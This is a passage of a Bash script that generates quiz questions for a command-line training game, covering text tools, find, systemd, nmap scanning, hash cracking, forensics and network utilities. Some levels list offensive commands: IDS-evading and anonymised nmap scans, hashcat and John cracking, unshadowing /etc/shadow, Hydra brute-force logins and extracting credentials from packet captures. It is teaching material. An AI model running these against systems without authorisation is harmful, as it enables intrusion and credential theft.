  questions+=("Search ${Y}${term}${C} in all .${ext} files, save to results.txt§grep -r ${term} --include='*.${ext}' > results.txt")
  questions+=("Find ${Y}${term}${C} lines, extract IPs, count unique§grep ${term} ${log} | grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' | sort -u | wc -l")

  printf '%s\n' "${questions[@]}"
}

# Level 15: File Finding (find, fd)
gen_level15() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx

  # By name
  questions+=("Find all .${ext} files|find . -name '*.${ext}'|fd -e ${ext}")
  questions+=("Find files named exactly 'config'|find . -name 'config'|fd -g 'config'")
  questions+=("Find 'config' files (case-insensitive)|find . -iname '*config*'|fd -i config")
  questions+=("Find files matching '*test*' pattern|find . -name '*test*'|fd test")

  # By size
  questions+=("Find files larger than ${size}|find . -size +${size}|fd -S +${size}")
  questions+=("Find files smaller than ${size}|find . -size -${size}|fd -S -${size}")
  questions+=("Find empty files|find . -type f -empty|fd -t e -t f")

  # By time
  questions+=("Find files modified in last ${time} minutes|find . -mmin -${time}|fd --changed-within ${time}m")
  questions+=("Find files NOT modified in last 7 days|find . -mtime +7|fd --changed-before 7d")
  questions+=("Find files accessed in last hour|find . -amin -60|fd --changed-within 1h")

  # By type
  questions+=("Find directories only|find . -type d|fd -t d")
  questions+=("Find regular files only|find . -type f|fd -t f")
  questions+=("Find symlinks only|find . -type l|fd -t l")
  questions+=("Find executable files|find . -type f -executable|fd -t x")

  # Hidden and exclusions
  questions+=("Find all files including hidden (fd excludes hidden by default)|fd -H")
  questions+=("Find all, excluding .git directory|find . -not -path './.git/*'|fd -E .git")
  questions+=("Find .${ext} files, excluding ${dir}/|find . -name '*.${ext}' -not -path './${dir}/*'|fd -e ${ext} -E ${dir}")
  questions+=("Find files excluding multiple dirs|find . -not -path './node_modules/*' -not -path './.git/*'|fd -E node_modules -E .git")

  # Path matching
  questions+=("Find files in paths matching */${dir}/*|find . -path '*/${dir}/*'|fd -p ${dir}/")
  questions+=("Find test files in src directory|find . -path '*/src/*' -name '*test*'|fd -p 'src/.*test'")

  # Max depth
  questions+=("Find .${ext} files, max 2 levels deep|find . -maxdepth 2 -name '*.${ext}'|fd -e ${ext} -d 2")
  questions+=("Find only in current dir (no recursion)|find . -maxdepth 1 -type f|fd -d 1 -t f")

  # === COMPOUND: Uses grep (L14), pipes (L3), wc (L2), logic (L6) ===
  questions+=("Find .${ext} files containing '${term}'§find . -name '*.${ext}' -exec grep -l ${term} {} \\;§fd -e ${ext} -x grep -l ${term} {}")
  questions+=("Find .${ext} files, count total lines§find . -name '*.${ext}' -exec wc -l {} + | tail -1")
  questions+=("Find large files (>${size}), show sizes sorted§find . -size +${size} -exec du -h {} \\; | sort -rh")
  questions+=("Find .${ext} files modified today, grep for '${term}'§find . -name '*.${ext}' -mtime 0 -exec grep -l ${term} {} \\;")
  questions+=("Find empty files and remove them (with confirm)§find . -type f -empty -print -delete")

  printf '%s\n' "${questions[@]}"
}

# Level 16: Data Processing
gen_level16() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
  local proc2=$(_pick PROCS) col2=$(_rnum 1 5) col3=$((col + 1)) chars=$(_rnum 10 80) thresh=$(_rnum 50 500)

  # Sorting
  questions+=("Sort ${txt} alphabetically (use ${Y}sort${C})|sort ${txt}")
  questions+=("Sort ${txt} in reverse (use ${Y}sort${C})|sort -r ${txt}")
  questions+=("Sort ${txt} numerically (use ${Y}sort${C})|sort -n ${txt}")
  questions+=("Sort ${txt} numerically descending (use ${Y}sort${C})|sort -rn ${txt}|sort -nr ${txt}")
  questions+=("Sort and remove duplicates (use ${Y}sort${C})|sort -u ${txt}")
  questions+=("Sort ${csv} by column ${col} (use ${Y}sort${C})|sort -t',' -k${col} ${csv}")
  questions+=("Sort ${csv} by column ${col} numerically|sort -t',' -k${col}n ${csv}|sort -t',' -nk${col} ${csv}")
  questions+=("Sort ${csv} by column ${col} descending|sort -t',' -k${col}rn ${csv}|sort -t',' -rnk${col} ${csv}")
  questions+=("Sort by human-readable sizes (1K, 2M, 3G)|sort -h")
  questions+=("Sort ${txt} case-insensitively|sort -f ${txt}|sort --ignore-case ${txt}")
  questions+=("Sort ${csv} by column ${col} then ${col2}|sort -t',' -k${col},${col} -k${col2},${col2} ${csv}")

  # Uniqueness
  questions+=("Remove adjacent duplicate lines (use ${Y}uniq${C})|uniq ${txt}")
  questions+=("Count occurrences of each unique line (use ${Y}uniq${C})|sort ${txt} | uniq -c")
  questions+=("Show only duplicate lines§sort ${txt} | uniq -d")
  questions+=("Show only unique lines (appear once)§sort ${txt} | uniq -u")
  questions+=("Count unique lines in ${txt}§sort ${txt} | uniq | wc -l§sort -u ${txt} | wc -l")
  questions+=("Show all duplicates (repeated lines)§sort ${txt} | uniq -D")

  # Cutting columns
  questions+=("Extract column ${col} from ${csv} (use ${Y}cut${C})|cut -d',' -f${col} ${csv}")
  questions+=("Extract columns ${col} and ${col3} from ${csv}|cut -d',' -f${col},${col3} ${csv}")
  questions+=("Extract columns ${col} through ${col3}|cut -d',' -f${col}-${col3} ${csv}")
  questions+=("Extract first ${chars} characters of each line|cut -c1-${chars} ${txt}")
  questions+=("Extract from character ${chars} to end of line|cut -c${chars}- ${txt}")
  questions+=("Extract column ${col} from colon-separated file|cut -d':' -f${col} /etc/passwd")
  questions+=("Extract all but column ${col}|cut -d',' --complement -f${col} ${csv}")
  questions+=("Extract using tab delimiter|cut -f${col} ${txt}")

  # Basic awk
  questions+=("Print first column of ${txt} (use ${Y}awk${C})|awk '{print \$1}' ${txt}")
  questions+=("Print last column of each line|awk '{print \$NF}' ${txt}")
  questions+=("Print columns ${col} and ${col2}|awk '{print \$${col}, \$${col2}}' ${txt}")
  questions+=("Print lines longer than ${chars} chars|awk 'length > ${chars}' ${txt}")
  questions+=("Print line numbers with content|awk '{print NR, \$0}' ${txt}")
  questions+=("Sum numbers in column ${col} of ${csv}|awk -F',' '{sum+=\$${col}} END {print sum}' ${csv}")
  questions+=("Print lines where column ${col} > ${thresh}|awk -F',' '\$${col} > ${thresh}' ${csv}")
  questions+=("Print lines where column ${col} equals \"${field}\"|awk -F',' '\$${col} == \"${field}\"' ${csv}")
  questions+=("Print every ${col}th line|awk 'NR % ${col} == 0' ${txt}")
  questions+=("Print lines ${n} through ${n2}|awk 'NR>=${n} && NR<=${n2}' ${txt}|sed -n '${n},${n2}p' ${txt}")
  questions+=("Average of column ${col}|awk -F',' '{sum+=\$${col}; count++} END {print sum/count}' ${csv}")
  questions+=("Maximum value in column ${col}|awk -F',' 'BEGIN{max=0} \$${col}>max{max=\$${col}} END{print max}' ${csv}")
  questions+=("Swap columns 1 and 2 in output|awk '{print \$2, \$1}' ${txt}")
  questions+=("Print unique values from column ${col}|awk -F',' '!seen[\$${col}]++' ${csv}")
  questions+=("Count records by column ${col} value|awk -F',' '{count[\$${col}]++} END {for(k in count) print k, count[k]}' ${csv}")

  # Field manipulation with tr
  questions+=("Replace spaces with tabs (use ${Y}tr${C})|tr ' ' '\\t' < ${txt}")
  questions+=("Delete all digits from ${txt}|tr -d '0-9' < ${txt}")
  questions+=("Squeeze multiple spaces to single|tr -s ' ' < ${txt}")
  questions+=("Convert to lowercase|tr 'A-Z' 'a-z' < ${txt}|tr '[:upper:]' '[:lower:]' < ${txt}")
  questions+=("Convert to uppercase|tr 'a-z' 'A-Z' < ${txt}|tr '[:lower:]' '[:upper:]' < ${txt}")
  questions+=("Delete all whitespace|tr -d '[:space:]' < ${txt}")
  questions+=("Replace newlines with spaces|tr '\\n' ' ' < ${txt}")
  questions+=("Convert tabs to spaces|tr '\\t' ' ' < ${txt}")

  # Useful pipes - dynamic counts
  questions+=("Top ${n} most common lines in ${log}§sort ${log} | uniq -c | sort -rn | head -${n}§sort ${log} | uniq -c | sort -nr | head -${n}")
  questions+=("Count unique values in column ${col}§cut -d',' -f${col} ${csv} | sort | uniq -c")
  questions+=("Extract and count unique IPs from ${log}§grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' ${log} | sort | uniq -c | sort -rn")
  questions+=("Most common words in ${txt}§tr -s ' ' '\\n' < ${txt} | sort | uniq -c | sort -rn | head")
  questions+=("Lines appearing in both ${txt} and ${txt2}§sort ${txt} ${txt2} | uniq -d§comm -12 <(sort ${txt}) <(sort ${txt2})")
  questions+=("Lines only in ${txt}, not ${txt2}|comm -23 <(sort ${txt}) <(sort ${txt2})")

  # Process management
  questions+=("List all processes (use ${Y}ps${C})|ps aux")
  questions+=("$(_phrase "Find" "Show" "List") processes matching '${proc}'§ps aux | grep ${proc}§pgrep -a ${proc}")
  questions+=("Get PID of ${proc}|pgrep ${proc}|pidof ${proc}")
  questions+=("Kill ${proc} process|pkill ${proc}")
  questions+=("Kill all processes matching '${proc}'|pkill -f ${proc}")
  questions+=("Kill ${proc} with SIGKILL|pkill -9 ${proc}|pkill -KILL ${proc}")
  questions+=("Show process tree|ps auxf|pstree")
  questions+=("Show process tree for ${proc}|pstree -p \$(pgrep ${proc})")
  questions+=("Find what's using port ${port}§ss -tlpn | grep ${port}§lsof -i :${port}")
  questions+=("List processes sorted by CPU usage§ps aux --sort=-%cpu | head")
  questions+=("List processes sorted by memory usage§ps aux --sort=-%mem | head")
  questions+=("Show top ${n} processes by memory§ps aux --sort=-%mem | head -${n}")
  questions+=("Find zombie processes§ps aux | grep -w Z§ps aux | awk '\$8==\"Z\"'")

  # Modern network info (ip/ss)
  questions+=("$(_phrase "Show" "Display" "List") IP addresses|ip addr|ip a")
  questions+=("Show routing table|ip route|ip r")
  questions+=("Show listening TCP ports|ss -tlpn|ss -tlnp")
  questions+=("Show all TCP connections|ss -ta|ss -at")
  questions+=("Show UDP listeners|ss -ulpn|ss -ulnp")
  questions+=("Show connections to port ${port}|ss -tn sport = :${port}")
  questions+=("Show established connections|ss -t state established")
  questions+=("Show socket statistics summary|ss -s")
  questions+=("Show connections by process|ss -tp")

  printf '%s\n' "${questions[@]}"
}

# Level 19: Batch Operations
gen_level19() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
  local svc2=$(_pick SERVICES) parallel=$(_rnum 2 8) linenum=$(_rnum 1 20)

  # find -exec - with flag alternatives
  questions+=("Run ls -l on each .${ext} file found|find . -name '*.${ext}' -exec ls -l {} \\;|fd -e ${ext} -x ls -l {}")
  questions+=("Count lines in each .${ext} file|find . -name '*.${ext}' -exec wc -l {} \\;|fd -e ${ext} -x wc -l {}")
  questions+=("Delete all .${ext2} files|find . -name '*.${ext2}' -delete|fd -e ${ext2} -x rm {}")
  questions+=("Make all .sh files executable|find . -name '*.sh' -exec chmod +x {} \\;|fd -e sh -x chmod +x {}")
  questions+=("Search '${term}' in each .${ext} file|find . -name '*.${ext}' -exec grep ${term} {} \\;|fd -e ${ext} -x rg ${term} {}")
  questions+=("Show size of files larger than ${size}|find . -size +${size} -exec du -h {} \\;|fd -S +${size} -x du -h {}")
  questions+=("Copy all .${ext} files to ${dir}/|find . -name '*.${ext}' -exec cp {} ${dir}/ \\;|fd -e ${ext} -x cp {} ${dir}/")
  questions+=("Move all .${ext2} files to ${dir}/|find . -name '*.${ext2}' -exec mv {} ${dir}/ \\;|fd -e ${ext2} -x mv {} ${dir}/")
  questions+=("Change owner of all files in ${dir}/|find ${dir}/ -exec chown user:group {} \\;")
  questions+=("Gzip all .${ext} files|find . -name '*.${ext}' -exec gzip {} \\;|fd -e ${ext} -x gzip {}")

  # Batch with + (more efficient)
  questions+=("List all .${ext} files in one ls call|find . -name '*.${ext}' -exec ls -l {} +")
  questions+=("Count total lines across all .${ext} files|find . -name '*.${ext}' -exec wc -l {} + | tail -1")
  questions+=("Cat all .${ext} files together|find . -name '*.${ext}' -exec cat {} +")

  # sed replacement - more patterns
  questions+=("Replace '${old}' with '${new}' in ${cfg}|sed -i 's/${old}/${new}/g' ${cfg}|sd '${old}' '${new}' ${cfg}")
  questions+=("Replace '${old}' with '${new}' (first occurrence only)|sed -i 's/${old}/${new}/' ${cfg}")
  questions+=("Delete lines containing '${term}' in ${log}|sed -i '/${term}/d' ${log}")
  questions+=("Delete empty lines from ${txt}|sed -i '/^$/d' ${txt}")
  questions+=("Delete lines ${linenum} to $((linenum + n)) from ${txt}|sed -i '${linenum},$((linenum + n))d' ${txt}")
  questions+=("Add prefix 'LOG: ' to each line|sed -i 's/^/LOG: /' ${log}")
  questions+=("Add suffix '.bak' to each line|sed -i 's/\$/.bak/' ${txt}")
  questions+=("Replace '${old}' in all .${ext} files|find . -name '*.${ext}' -exec sed -i 's/${old}/${new}/g' {} \\;|fd -e ${ext} -x sd '${old}' '${new}' {}")
  questions+=("Case-insensitive replace '${old}'|sed -i 's/${old}/${new}/gi' ${cfg}")
  questions+=("Print only lines matching '${term}'|sed -n '/${term}/p' ${log}")
  questions+=("Insert text at line ${linenum}|sed -i '${linenum}i\\inserted text' ${txt}")
  questions+=("Append text after line ${linenum}|sed -i '${linenum}a\\appended text' ${txt}")

  # xargs - building commands from stdin
  questions+=("Delete files listed in ${txt}§cat ${txt} | xargs rm§xargs rm < ${txt}")
  questions+=("Run grep on files from find§find . -name '*.${ext}' | xargs grep ${term}")
  questions+=("Process files with spaces in names§find . -name '*.${ext}' -print0 | xargs -0 wc -l")
  questions+=("Grep in parallel (${parallel} jobs)§find . -name '*.${ext}' -print0 | xargs -0 -P ${parallel} grep ${term}")
  questions+=("Confirm before each delete (interactive)§find . -name '*.${ext2}' -print0 | xargs -0 -p rm")
  questions+=("Copy files in batches of ${n}§find . -name '*.${ext}' -print0 | xargs -0 -n ${n} cp -t ${dir}/")
  questions+=("Rename each file with prefix§find . -name '*.${ext}' | xargs -I {} mv {} backup_{}")
  questions+=("Preview what xargs would run (-t flag)§find . -name '*.${ext}' -print0 | xargs -0 -t wc -l")

  # Combined operations
  questions+=("Find .${ext} files > ${size}, show sizes sorted|find . -name '*.${ext}' -size +${size} -exec du -h {} \\; | sort -rh")
  questions+=("Replace and backup: ${old} -> ${new}, keep .bak|sed -i.bak 's/${old}/${new}/g' ${cfg}")
  questions+=("Find and replace recursively in ${dir}/|find ${dir}/ -type f -exec sed -i 's/${old}/${new}/g' {} \\;")

  # Systemd service management - DYNAMIC service names
  questions+=("Check status of ${svc} service|systemctl status ${svc}")
  questions+=("Start ${svc} service|systemctl start ${svc}|sudo systemctl start ${svc}")
  questions+=("Stop ${svc} service|systemctl stop ${svc}|sudo systemctl stop ${svc}")
  questions+=("Restart ${svc} service|systemctl restart ${svc}|sudo systemctl restart ${svc}")
  questions+=("Enable ${svc} to start on boot|systemctl enable ${svc}|sudo systemctl enable ${svc}")
  questions+=("Disable ${svc} from starting on boot|systemctl disable ${svc}|sudo systemctl disable ${svc}")
  questions+=("Reload ${svc} config without restart|systemctl reload ${svc}|sudo systemctl reload ${svc}")
  questions+=("Check if ${svc} is enabled|systemctl is-enabled ${svc}")
  questions+=("Check if ${svc} is active|systemctl is-active ${svc}")
  questions+=("Show ${svc} unit file|systemctl cat ${svc}")
  questions+=("Edit ${svc} unit file override|systemctl edit ${svc}|sudo systemctl edit ${svc}")
  questions+=("List all running services|systemctl list-units --type=service --state=running")
  questions+=("List failed services|systemctl --failed")
  questions+=("Mask ${svc} (prevent starting)|systemctl mask ${svc}|sudo systemctl mask ${svc}")
  questions+=("Unmask ${svc}|systemctl unmask ${svc}|sudo systemctl unmask ${svc}")
  questions+=("Daemon reload after unit file change|systemctl daemon-reload|sudo systemctl daemon-reload")

  # Journalctl - DYNAMIC service names and line counts
  questions+=("View logs for ${svc} service|journalctl -u ${svc}")
  questions+=("Follow logs for ${svc} in realtime|journalctl -u ${svc} -f|journalctl -fu ${svc}")
  questions+=("View last ${n2} log lines for ${svc}|journalctl -u ${svc} -n ${n2}")
  questions+=("View logs since boot|journalctl -b")
  questions+=("View kernel messages|journalctl -k|dmesg")
  questions+=("View logs from last hour|journalctl --since '1 hour ago'")
  questions+=("View logs from last ${n} minutes|journalctl --since '${n} minutes ago'")
  questions+=("View errors only|journalctl -p err|journalctl -p 3")
  questions+=("View ${svc} errors only|journalctl -u ${svc} -p err")
  questions+=("Disk usage of journal|journalctl --disk-usage")
  questions+=("Vacuum journal to ${size}|journalctl --vacuum-size=${size}|sudo journalctl --vacuum-size=${size}")
  questions+=("Output as JSON|journalctl -u ${svc} -o json")

  # === COMPOUND: Uses grep (L14), pipes (L3), logic (L6), find (L15) ===
  questions+=("Replace '${old}' in all .${ext} files, confirm changes§find . -name '*.${ext}' -exec grep -l ${old} {} \\; | xargs sed -i 's/${old}/${new}/g'")
  questions+=("Find .${ext} files > ${size}, delete with confirm§find . -name '*.${ext}' -size +${size} -print -delete")
  questions+=("Check ${svc} status, restart if not active§systemctl is-active ${svc} || systemctl restart ${svc}")
  questions+=("View ${svc} errors, count unique messages§journalctl -u ${svc} -p err --no-pager | sort | uniq -c | sort -rn")
  questions+=("Find and grep all logs modified today§find /var/log -mtime 0 -type f -exec grep -l ${term} {} \\;")

  printf '%s\n' "${questions[@]}"
}

# Level 23: Network Scanning (nmap)
gen_level23() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
  port2=$((port + 1000))

  # Basic scans
  questions+=("Scan all 65535 ports on ${ip}|nmap -p- ${ip}")
  questions+=("Scan top 100 most common ports on ${ip}|nmap --top-ports 100 ${ip}")
  questions+=("Scan specific ports ${port},${port2} on ${ip}|nmap -p ${port},${port2} ${ip}")
  questions+=("Scan port range 1-1000 on ${ip}|nmap -p 1-1000 ${ip}")
  questions+=("Fast scan (top 100 ports) on ${ip}|nmap -F ${ip}")

  # Service/version detection
  questions+=("Detect service versions (banner grab) on ${ip}|nmap -sV ${ip}")
  questions+=("OS fingerprinting via TCP/IP stack on ${ip}|nmap -O ${ip}")
  questions+=("Aggressive scan (-A = OS, version, scripts, traceroute)|nmap -A ${ip}")
  questions+=("Run default NSE scripts (-sC) on ${ip}|nmap -sC ${ip}")
  questions+=("Combined recon: version + scripts on ${ip}|nmap -sV -sC ${ip}")

  # Scan types
  questions+=("UDP scan top 20 ports on ${ip}|nmap -sU --top-ports 20 ${ip}")
  questions+=("TCP connect scan on ${ip} (full handshake)|nmap -sT ${ip}")
  questions+=("TCP SYN scan on ${ip} (stealth, default)|nmap -sS ${ip}")
  questions+=("Scan ${ip}, skip host discovery (treat as up)|nmap -Pn ${ip}")

  # Network discovery
  questions+=("Ping sweep ${subnet} (find live hosts)|nmap -sn ${subnet}")
  questions+=("List targets in ${subnet} without scanning|nmap -sL ${subnet}")
  questions+=("ARP scan local network ${subnet}|nmap -PR -sn ${subnet}")

  # Output formats
  questions+=("Scan ${ip}, save all formats to 'scan' prefix|nmap -oA scan ${ip}")
  questions+=("Scan ${ip}, save greppable output to scan.gnmap|nmap -oG scan.gnmap ${ip}")

  # Scripts
  questions+=("Run vulnerability scripts on ${ip}|nmap --script vuln ${ip}")
  questions+=("Banner grab port ${port} on ${ip}|nmap -sV -p ${port} --script banner ${ip}")
  questions+=("Enumerate SMB shares on ${ip}|nmap --script smb-enum-shares ${ip}")
  questions+=("Enumerate HTTP methods on ${ip}|nmap --script http-methods -p 80,443 ${ip}")
  questions+=("Check for anonymous FTP on ${ip}|nmap --script ftp-anon -p 21 ${ip}")

  # Speed and stealth
  questions+=("Scan ${ip} through proxychains (anonymize)|proxychains nmap -sT ${ip}")
  questions+=("Slow scan ${ip} (evade IDS)|nmap -T1 ${ip}")
  questions+=("Aggressive timing scan ${ip} (faster)|nmap -T4 ${ip}")

  # Combined
  questions+=("Full scan: all ports, version, scripts, all outputs|nmap -p- -sV -sC -oA full ${ip}")

  printf '%s\n' "${questions[@]}"
}

# Level 25: Hash Cracking
gen_level25() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
  local hidx=$((RANDOM % ${#HASHCAT_MODES[@]}))
  local hmode=${HASHCAT_MODES[$hidx]} hname=${HASH_NAMES[$hidx]}

  # Hashcat dictionary attacks
  questions+=("Dictionary attack on MD5 (-m 0) hashes in ${hash}|hashcat -m 0 ${hash} ${wordlist}")
  questions+=("Dictionary attack on ${hname} (-m ${hmode}) hashes|hashcat -m ${hmode} ${hash} ${wordlist}")
  questions+=("Crack Windows NTLM hashes (-m 1000) in ${hash}|hashcat -m 1000 ${hash} ${wordlist}")

  # Hashcat brute force
  questions+=("Brute force 4-digit PIN (MD5)|hashcat -m 0 -a 3 ${hash} ?d?d?d?d")
  questions+=("Mask attack: Capital + 5 lower + 2 digits|hashcat -m 0 -a 3 ${hash} ?u?l?l?l?l?l?d?d")

  # Hashcat rules & session
  questions+=("Crack ${hash} with rules file|hashcat -m 0 -r rules/best64.rule ${hash} ${wordlist}")
  questions+=("Show already cracked from ${hash}|hashcat -m 0 ${hash} --show")
  questions+=("Resume interrupted hashcat session|hashcat --restore")

  # John the Ripper
  questions+=("Crack ${hash} with john (auto-detect format)|john ${hash}")
  questions+=("Crack ${hash} with john using ${wordlist}|john --wordlist=${wordlist} ${hash}")
  questions+=("Show cracked passwords from john|john --show ${hash}")
  questions+=("List supported john formats|john --list=formats")

  # John hash extraction (FIXED - was incorrect before)
  questions+=("Extract hash from encrypted ZIP file|zip2john archive.zip > hash.txt")
  questions+=("Extract hash from encrypted PDF|pdf2john document.pdf > hash.txt")
  questions+=("Extract hash from encrypted RAR|rar2john archive.rar > hash.txt")
  questions+=("Extract hash from /etc/shadow format|unshadow /etc/passwd /etc/shadow > hash.txt")

  # Hydra
  questions+=("Brute force SSH login for ${user} on ${ip}|hydra -l ${user} -P ${wordlist} ${ip} ssh")
  questions+=("Brute force FTP login for ${user} on ${ip}|hydra -l ${user} -P ${wordlist} ${ip} ftp")
  questions+=("Brute force HTTP basic auth on ${ip}|hydra -l ${user} -P ${wordlist} ${ip} http-get /")
  questions+=("Brute force HTTP POST login form|hydra -l ${user} -P ${wordlist} ${ip} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'")
  questions+=("Brute force with username list too|hydra -L users.txt -P ${wordlist} ${ip} ssh")
  questions+=("Limit hydra to 4 parallel tasks|hydra -t 4 -l ${user} -P ${wordlist} ${ip} ssh")

  # Encoding/decoding
  questions+=("Encode string 'secret' to base64|echo -n 'secret' | base64")
  questions+=("Decode base64 file encoded.txt|base64 -d encoded.txt")
  questions+=("Generate MD5 hash of string 'password'|echo -n 'password' | md5sum")
  questions+=("Generate SHA256 hash of string|echo -n 'password' | sha256sum")
  questions+=("Generate SHA256 hash of file ${hash}|sha256sum ${hash}")

  # Hex operations
  questions+=("Convert 'hello' to hex|echo -n 'hello' | xxd -p")
  questions+=("Convert hex back to ascii|echo '68656c6c6f' | xxd -r -p")
  questions+=("Hex dump of binary with addresses|xxd ${bin}")
  questions+=("Hex dump binary (no addresses)|xxd -p ${bin}")

  printf '%s\n' "${questions[@]}"
}

# Level 26: Forensics
gen_level26() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx

  # String extraction
  questions+=("Extract ASCII strings from ${bin}|strings ${bin}")
  questions+=("Extract strings minimum 10 chars|strings -n 10 ${bin}")
  questions+=("Extract Unicode strings (Windows binaries)|strings -e l ${bin}")
  questions+=("Find URLs in binary|strings ${bin} | grep -E 'https?://'")
  questions+=("Find email addresses in binary|strings ${bin} | grep -E '[A-Za-z0-9._%+-]+@'")

  # ELF analysis
  questions+=("Show ELF file header|readelf -h ${bin}")
  questions+=("Show ELF symbols|readelf -s ${bin}")
  questions+=("Show all ELF info|readelf -a ${bin}")
  questions+=("List shared library dependencies|ldd ${bin}")

  # Radare2
  questions+=("Analyze ${bin} with radare2|r2 -A ${bin}")
  questions+=("Disassemble main function|r2 -qc 'aaa; pdf @main' ${bin}")
  questions+=("List functions in binary|r2 -qc 'aaa; afl' ${bin}")

  # Binwalk
  questions+=("Scan ${bin} for embedded files|binwalk ${bin}")
  questions+=("Extract embedded files from ${bin}|binwalk -e ${bin}")
  questions+=("Analyze entropy of ${bin}|binwalk -E ${bin}")

  # Memory forensics (volatility3) - most common
  questions+=("List processes from memory dump|volatility3 -f ${img} windows.pslist")
  questions+=("List network connections from memory|volatility3 -f ${img} windows.netscan")

  # File metadata
  questions+=("Extract all metadata from ${photo}|exiftool ${photo}")
  questions+=("Extract GPS coordinates from photo|exiftool -gps* ${photo}")
  questions+=("Remove all metadata from ${photo}|exiftool -all= ${photo}")

  # Disk imaging
  questions+=("Create disk image of /dev/sda|dd if=/dev/sda of=${img} bs=4M status=progress")
  questions+=("Mount disk image read-only|mount -o ro,loop ${img} /mnt/evidence")
  questions+=("Verify checksums file|sha256sum -c ${hash}")

  printf '%s\n' "${questions[@]}"
}

# Level 22: Network Tools
gen_level22() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx

  # tshark - packet capture & analysis
  questions+=("Capture traffic on ${iface} to ${pcap}|tshark -i ${iface} -w ${pcap}")
  questions+=("Capture only 100 packets|tshark -i ${iface} -c 100 -w ${pcap}")
  questions+=("Read and display ${pcap}|tshark -r ${pcap}")
  questions+=("Filter HTTP traffic from ${pcap}|tshark -r ${pcap} -Y http")
  questions+=("Filter traffic to/from ${ip}|tshark -r ${pcap} -Y 'ip.addr == ${ip}'")
  questions+=("Show only DNS queries|tshark -r ${pcap} -Y 'dns.qry.name'")
  questions+=("Extract HTTP POST data|tshark -r ${pcap} -Y 'http.request.method == POST' -T fields -e http.file_data")
  questions+=("Extract all URLs from capture|tshark -r ${pcap} -Y 'http.request' -T fields -e http.host -e http.request.uri")
  questions+=("Show TCP conversations|tshark -r ${pcap} -q -z conv,tcp")
  questions+=("Extract credentials (FTP, HTTP basic)§tshark -r ${pcap} -Y 'ftp.request.command == PASS || http.authbasic'")

  # jq - JSON processing
  questions+=("Pretty print JSON file (use ${Y}jq${C})|jq '.' data/export.json")
  questions+=("Extract '${key}' array from JSON|jq '.${key}' data/export.json")
  questions+=("Extract first item from '${key}' array|jq '.${key}[0]' data/export.json")
  questions+=("Extract 'name' field from each item|jq '.${key}[] | .name' data/export.json")
  questions+=("Filter items where status is 'active'|jq '.${key}[] | select(.status == \"active\")' data/export.json")
  questions+=("Count items in array|jq '.${key} | length' data/export.json")
  questions+=("Get keys of JSON object|jq 'keys' data/export.json")
  questions+=("Compact JSON (remove whitespace)|jq -c '.' data/export.json")
  questions+=("Create new object from fields|jq '.${key}[] | {name: .name, id: .id}' data/export.json")
  questions+=("Parse JSON from curl output|curl -s ${url}/api | jq '.${key}'")

  # curl - HTTP client
  questions+=("GET request to ${url} (use ${Y}curl${C})|curl ${url}")
  questions+=("GET request with headers shown|curl -i ${url}")
  questions+=("POST JSON data|curl -X POST -H 'Content-Type: application/json' -d '{\"key\":\"value\"}' ${url}/api")
  questions+=("POST form data|curl -X POST -d 'user=admin&pass=test' ${url}/login")
  questions+=("Follow redirects|curl -L ${url}")
  questions+=("Save output to file|curl -o output.html ${url}")
  questions+=("Send with custom header|curl -H 'Authorization: Bearer token123' ${url}/api")
  questions+=("Silent mode (no progress)|curl -s ${url}")
  questions+=("Download file with original name|curl -O ${url}/file.tar.gz")

  # SSH tunneling (CRITICAL for pentesting)
  questions+=("SSH local port forward: access remote ${port} via local 8080|ssh -L 8080:localhost:${port} ${user}@${host}")
  questions+=("SSH remote port forward: expose local ${port} on remote|ssh -R ${port}:localhost:${port} ${user}@${host}")
  questions+=("SSH dynamic SOCKS proxy on port 1080|ssh -D 1080 ${user}@${host}")
  questions+=("SSH through jump host to target|ssh -J ${user}@jump ${user}@target")
  questions+=("SSH tunnel in background|ssh -fN -L 8080:localhost:80 ${user}@${host}")
  questions+=("SSH execute remote command|ssh ${user}@${host} 'ls -la'")
  questions+=("SCP file to remote|scp file.txt ${user}@${host}:/tmp/")
  questions+=("Rsync with progress|rsync -avz --progress file.txt ${user}@${host}:/backup/")

  # wget
  questions+=("Download file (use ${Y}wget${C})|wget ${url}/file.tar.gz")
  questions+=("Continue interrupted download|wget -c ${url}/large.iso")
  questions+=("Mirror website for offline|wget -mk ${url}")

  # OpenSSL (cert checking, encryption)
  questions+=("Check SSL cert of website|openssl s_client -connect ${host}:443")
  questions+=("Generate random 32-byte hex string|openssl rand -hex 32")
  questions+=("Encrypt file with AES-256|openssl enc -aes-256-cbc -salt -in file.txt -out file.enc")
  questions+=("Decrypt AES-256 file|openssl enc -d -aes-256-cbc -in file.enc -out file.txt")
  questions+=("Generate RSA key pair|openssl genrsa -out key.pem 4096")

  # URL encoding (web testing)
  questions+=("URL encode a string|python3 -c \"import urllib.parse; print(urllib.parse.quote('test string'))\"")

  printf '%s\n' "${questions[@]}"
}

# Level 24: WiFi & RF
gen_level24() {
